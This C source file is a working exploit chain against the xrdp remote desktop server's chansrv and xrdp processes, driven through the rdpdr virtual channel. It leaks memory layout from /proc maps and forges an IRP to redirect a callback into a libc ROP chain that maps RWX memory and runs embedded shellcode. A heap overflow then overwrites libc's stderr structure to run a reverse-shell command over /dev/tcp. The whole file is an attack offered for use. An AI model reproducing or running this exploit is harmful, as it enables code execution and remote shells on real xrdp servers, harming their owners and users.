#if defined(HAVE_CONFIG_H)
#include <config_ac.h>
#endif

#include "xrdpapi.h"
#include "log.h"

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

#define p8(a) pay[len++] = a
#define p16(a)                                      \
    do {                                            \
        *(uint16_t*)(pay + len) = (uint16_t)(a);    \
        len += 2;                                   \
    } while (0) 
#define p32(a)                                      \
    do {                                            \
        *(uint32_t*)(pay + len) = (uint32_t)(a);    \
        len += 4;                                   \
    } while (0) 
#define p64(a)                                      \
    do {                                            \
        *(uint64_t*)(pay + len) = (uint64_t)(a);    \
        len += 8;                                   \
    } while (0) 
#define copy(s)                                     \
    do {                                            \
        memcpy(&pay[len], s, sizeof(s) - 1);        \
        len += sizeof(s) - 1;                       \
    } while (0)
#define set(n, c)                                   \
    do {                                            \
        memset(&pay[len], (c), (n));                \
        len += (n);                                 \
    } while (0)
#define mark_end() len = 0

unsigned char pay[0x10000];
unsigned long len;

uint64_t thread_stack_leak(void) {
    uint64_t stack_base;
    char buf[0x100];
    FILE* fs;

    fs = popen("cat \"/proc/`ps -e | grep xrdp-chansrv | awk '{print $1}'`/maps\" | grep \"LC_CTYPE\" | awk 'NR  == 1 {printf \"0x\" substr($1, 0, 12)}'", "r");

    fscanf(fs, "%lx", &stack_base);

    pclose(fs);

    return stack_base;
}

uint64_t code_leak(void) {
    uint64_t code_base;
    char buf[0x100];
    FILE* fs;

    fs = popen("cat \"/proc/`ps -e | grep xrdp-chansrv | awk '{print $1}'`/maps\" | grep xrdp-chansrv | awk 'NR  == 1 {printf \"0x\" substr($1, 0, 12)}'", "r");

    fscanf(fs, "%lx", &code_base);

    pclose(fs);

    return code_base;
}

uint64_t libc_leak(void) {
    uint64_t libc_base;
    char buf[0x100];
    FILE* fs;

    fs = popen("cat \"/proc/`ps -e | grep xrdp-chansrv | awk '{print $1}'`/maps\" | grep libc.so.6 | awk 'NR  == 1 {printf \"0x\" substr($1, 0, 12)}'", "r");

    fscanf(fs, "%lx", &libc_base);

    pclose(fs);

    return libc_base;
}

int exploit_xrdp_chansrv(void* channel) {
    uint64_t libc_base, code_base, thread_stack_base;
    uint32_t bytes_written;
    uint32_t rv; 
    
    thread_stack_base = thread_stack_leak();
    // printf("[chansrv] stack base: %#lx\n", thread_stack_base);
    code_base = code_leak();
    /* printf("[chansrv] code base: %#lx\n", code_base); */
    libc_base = libc_leak();
    /* printf("[chansrv] libc base: %#lx\n", libc_base); */

    // Overwrite g_irp_head
    p16(0x4472);
    p16(0x7777);
    p16(0x4472);
    p16(0x4441);
    p32(0x1);                           // device_count
    p32(0x8);                           // device type
    p32(0x1234);                        // g_device_id
    copy("test\x00\x00\x00\x00"); // preferred_dos_name
    p32(0x418);                         // device_data_len

    uint32_t tmp = len;
    // fake IRP structure
    p32(0x22);                          // CompletionId
    p32(0x7);                           // DeviceId
    // pop rax; add rsp, 0x58; ret
    p64(libc_base + 0x001284ec);        // FileId, completion_type
    p64(0x0);                           // pathname
    len += 0x28;                        // gen
    p64(0x0);                           // fuse_info
    p64(0x0);                           // next
    p64(0x0);                           // prev
    p32(0x0);                           // scard_index
    len += 4;                           // pad
    // leave; ret
    p64(libc_base + 0x00133d9a);        // callback
    p64(0x0);                           // user_data

    // ROP chain
    p64(libc_base + 0x001bc021);        // pop rdi; ret
    p64(0x41410000);
    p64(libc_base + 0x001bb317);        // pop rsi; ret
    p64(0x10000);
    p64(libc_base + 0x00165b76);        // pop r8; mov eax, 1, ret
    p64(0xffffffffffffffff);
    p64(libc_base + 0x11ebc0);          // mmap(0x41410000, 0x10000, 7, 0x32, -1, 0)
    p64(libc_base + 0x001bc021);        // pop rdi; ret
    p64(0x41410000);
    p64(libc_base + 0x001bb317);        // pop rsi; ret
    p64(code_base + 0x29420 + 0x140);   // &shellcode
    p64(libc_base + 0x00175548);        // pop rdx; pop rbx; ret
    p64(0x200);
    p64(0x0);
    p64(libc_base + 0xc48f0);           // memcpy(0x41410000, &shellcode, 0x200)
    p64(libc_base + 0x001bc021);        // pop rdi; ret
    p64(code_base + 0x29420 + 0x60);    // &callback
    p64(libc_base + 0x001bb317);        // pop rsi; ret
    p64(code_base + 0x29420 + 0x138);
    p64(libc_base + 0x00175548);        // pop rdx; pop rbx; ret
    p64(0x8);
    p64(0x0);
    p64(libc_base + 0xc48f0);           // memcpy(&callback, , 0x8)
    p64(libc_base + 0x001bb53b);        // pop rsp; ret
    p64(thread_stack_base - 0x1628);    // restore sp
    // end ROP chain

    p64(0x41410000);

    // shellcode
    /*
    push rbp
    mov rbp, rsp
    mov r12, [rdi]         
    mov r13, [rdi + 0x8]
    sub r13, r12  
    */
    copy("UH\x89\xe5L\x8b'L\x8bo\x08M)\xe5I\xbe");

    /*
    movabs r14, &g_con_trans
    mov r14, [r14] 
    mov rdi, r14 
    */           
    p64(code_base + 0x28d10);
    copy("M\x8b\x36L\x89\xf7H\xb8");

    /*
    movabs rax, trans_get_out_s
    mov rsi, r13
    call rax
    mov r15, rax
    mov rdi, [r15]
    mov rsi, r12
    mov rdx, r13
    */
    p64(code_base + 0x5444);
    copy("L\x89\xee\xff\xd0I\x89\xc7I\x8b?L\x89\xe6L\x89\xeaH\xb8");
    
    /*
    movabs rax, memcpy
    call rax
    add [r15], r13
    add [r15 + 0x8], r13
    cmp DWORD PTR [r12], 0xcafebabe
    jne send_payload
    sub QWORD PTR [r15 + 0x10], 0x8000
    send_payload: 
    mov rdi, r14 
    */
    p64(libc_base + 0xc48f0);
    copy("\xff\xd0M\x01/M\x01\x6f\x08\x41\x81\x3c\x24\xbe\xba\xfe\xcau\x08I\x81o\x10\x00\x80\x00\x00L\x89\xf7H\xb8");

    /*
    movabs rax, trans_write_copy
    call rax     
    leave          
    ret
    */
    p64(code_base + 0x5604);
    copy("\xff\xd0\xc9\xc3");
    len += 0x400 - (len - tmp);

    // overwrite g_irp_head
    p64(0x0);
    p64(0x0);
    p64(code_base + 0x29420);

    rv = WTSVirtualChannelWrite(channel, pay, len, &bytes_written);
    mark_end();

    return rv;
}

int xrdp_leak(void* channel, uint64_t* plibc_base, uint64_t* pheap_base) {
    uint32_t rv, bytes_written;
    int fd;
    uint8_t* mem;

    // invoke a ROP chain
    p16(0x4472);
    p16(0x7777);
    p16(0x4472);
    p16(0x4943);
    p32(0x7);                           // DeviceId     ( rdx )
    p32(0x22);                          // CompletionId ( rcx )
    p32(0x0);                           // IoStatus32   ( r8 )
    rv = WTSVirtualChannelWrite(channel, pay, len, &bytes_written);
    mark_end();

    p16(0x4472);
    p16(0x7777);
    p16(0x4472);
    p16(0x4943);
    p32(0x7);                           
    p32(0x22);                          
    p32(0x0);                    

    // payload 
    p32(0xdeadbeef);    // id
    p32(0x1a);          // header_size
    p32(0x8);           // id
    p32(0x12);          // size
    p16(0x0);           // chan_id
    p16(0x3);           // chan_flags
    p16(0xf900);        // size
    p32(0xf900);        // total_size

    rv = WTSVirtualChannelWrite(channel, pay, len, &bytes_written);
    mark_end();

    fd = open("/tmp/xrdp-mem", O_RDONLY);

    if (fd == -1) {
        return -1;
    }
    mem = calloc(0xf900, 1);
    read(fd, mem, 0xf900);

    *plibc_base = *(uint64_t*)(mem + 0x2402) - 0x21a000;
	*plibc_base = *plibc_base & 0xfffffffffffff000;
    *pheap_base = *(uint64_t*)(mem + 0x2412) - 0x5072a0;
    
    free(mem);

    return 0;
}

int xrdp_heap_overflow(struct wts_obj* channel, uint64_t libc_base, uint64_t heap_base) {
    uint32_t rv, bytes_written;
    uint32_t pause;

    // add a victim (size: 0x3d0) to small bins
    for (int i = 0; i < 0x3; i++) {
        p16(0x4472);
        p16(0x7777);
        p16(0x4472);
        p16(0x4943);
        p32(0x7);                           
        p32(0x22);                          
        p32(0x0);

        // payload (0x6a)
        p32(0xdeadbeef);    // id
        p32(0xb62 + i*0x10);         // header_size
        p32(0xa);           // id
        p32(0xb5a + i*0x10);         // size
        p32(0x2);           // order_type
        p32(0xffffffff);    // window_id
        set(0x10, 0);
        p16(0x400);
        set(0x400, 'A');
        set(0x30, 0);
        p16(0x79);
        set(0x3c8, 'B');
        p32(0);
        p32(0);
        p16(0x66 + i*2);
        set(0x330 + i*0x10, 'C');
        p32(0);

        rv = WTSVirtualChannelWrite(channel, pay, len, &bytes_written);
        mark_end();

        usleep(1000000);
    }

    printf("[xrdp] House of Lore\n");
    scanf("%d", &pause);

    p16(0x4472);
    p16(0x7777);
    p16(0x4472);
    p16(0x4943);
    p32(0x7);                           
    p32(0x22);                          
    p32(0x0);

    // payload (0x6a)
    p32(0xdeadbeef);    // id
    p32(0x2430);        // header_size
    p32(0xa);           // id
    p32(0x7f8);         // size
    p32(0x2);           // order_type
    p32(0xffffffff);    // window_id
    set(0x10, 0);
    p16(0x6);
    set(0x6, 'A');
    set(0x30, 0);
    p16(0x79);
    set(0x3c8, 'B');
    p32(0);
    p32(0);
    p16(0x79);

    set(0x10, 0);

    // next msg 2
    p32(0xa);
    p32(0x100);
    p32(0x2);
    p32(0xffffffff);
    set(0x10, 0);
    p16(0x3e0);

    set(0x3c8 - 0x32, 'C');
    p32(4);

    // next_msg 1
    p32(0xa);
    p32(0x20);

    // fake chunk 1  
    p64(0x3d1);
    p64(heap_base + 0x5072a0);     // victim
    p64(heap_base + 0x4ff1f8);     // fake chunk 2 (bck)
    set(0x3d0 - 0x20, 'D');
    p64(0x0);
    p64(0x3d1);                    // next size

    set(0x2014 - len, 'E');

    // chunk 1 (size: 0x410, freed) 
    p64(0x0);
    p64(0x411);
    p64((heap_base + 0x513b50) ^ ((heap_base + 0x506ea0) >> 12));
    set(0x3f8, 'A');
    
    // victim (size: 0x3d0, freed)
    p64(0);
    p64(0x3d1);
    p64(libc_base + 0x21a0a0);
    p64(heap_base + 0x505690);     // fake chunk 1

    rv = WTSVirtualChannelWrite(channel, pay, len, &bytes_written);
    mark_end(); 

    printf("[xrdp] Overwrite stderr\n");

    p16(0x4472);
    p16(0x7777);
    p16(0x4472);
    p16(0x4943);
    p32(0x7);                           
    p32(0x22);                          
    p32(0x0);

    set(0x1c, 'X');
    // fake small bins -> invoke assertion -> fflush(stderr)
    p64(libc_base + 0x21a0e0);
    p64(libc_base + 0x21a0e0);

    // fake small bin (set NON_MAIN_ARENA bit)
    p64(0x0);
    p64(0x405);
    p64(libc_base + 0x21a0c0);
    p64(libc_base + 0x21a0c0);

    set(0x430, 'X');

    p64(libc_base + 0x1d8698);  // program_invocation_short_name
    p64(libc_base + 0x1d8698);  // program_invocation_name
    
    set(0x160, 'X');

    // Overwrite stderr
    p64(0xfbad2086);            // _flags
    p64(0x0);                   // _IO_read_ptr
    p64(0x0);                   // _IO_read_end
    p64(0x0);                   // _IO_read_base
    p64(0x0);                   // _IO_write_base
    p64(0x0);                   // _IO_write_ptr
    p64(0x0);                   // _IO_write_end
    p64(0x0);                   // _IO_buf_base
    p64(0x0);                   // _IO_buf_end
    p64(0x0);                   // _IO_save_base
    p64(0x0);                   // _IO_backup_base
    p64(0x0);                   // _IO_save_end
    p64(0x0);                   // _markers
    p64(libc_base + 0x21a780);  // _chain
    p32(0x2);                   // _fileno
    p32(0x0);                   // _flags2
    p64(0xffffffffffffffff);    // _old_offset
    p64(0x0);                   // _cur_column
    p64(libc_base + 0x21ba60);  // _lock
    p64(0xffffffffffffffff);    // _offset
    p64(0x0);                   // _codecvt
    p64(libc_base + 0x2198a0);  // _wide_data
    p64(0x0);                   // _freeres_list
    p64(0x0);                   // _freeres_buf
    p64(0x0);                   //
    p64(0x0);                   // _freeres_list
    p64(0x0);                   // _freeres_buf
    p64(0x0);                   //
    p64(libc_base + 0x2163a0);  // vtable
    p64(libc_base + 0x21a780);  // obstack
    
    // struct obstack
    p64(0);                     // chunk_size
    p64(0);                     // chunk
    p64(0);                     // object_base                
    p64(0);                     // next_free
    p64(0);                     // chunk_limit
    p64(0);                     // temp
    p64(libc_base + 0x50d60);   // chunkfun
    p64(0);                     // freefun
    p64(libc_base + 0x21a7d8);  // extra_arg
    p64(0xffffffffffffffff);
    copy("bash -c 'sh -i >& /dev/tcp/127.0.0.1/12101 0>&1'\x00");

    rv = WTSVirtualChannelWrite(channel, pay, len, &bytes_written);
    mark_end(); 

    return 0;
}

int exploit(void) {
    void* channel;
    uint64_t libc_base, heap_base;
    uint32_t pause;
      
    /* open a virtual channel named rdpdr */
    channel = WTSVirtualChannelOpenEx(WTS_CURRENT_SESSION, "rdpdr", 0);

    if (channel == NULL)
    {
        printf("[-] WTSVirtualChannelOpenEx() failed!\n");
        return -1;
    }

    printf("[xrdp-chansrv] trying to exploit...\n");
    while (1) {
        exploit_xrdp_chansrv(channel);

        if (!xrdp_leak(channel, &libc_base, &heap_base)) {
            printf("[xrdp] libc_base: %#lx\n", libc_base);
            printf("[xrdp] heap_base: %#lx\n", heap_base);
            break;
        }

        usleep(100000);
    }

    xrdp_heap_overflow(channel, libc_base, heap_base);

    WTSVirtualChannelClose(channel);
    return 0;
}

int main(int argc, char **argv) {
    int result;
    struct log_config *lc;

    if ((lc = log_config_init_for_console(LOG_LEVEL_DEBUG, NULL)) != NULL) {
        log_start_from_param(lc);
    }

    exploit();

    if (lc != NULL) {
        log_config_free(lc);
        log_end();
    }
}

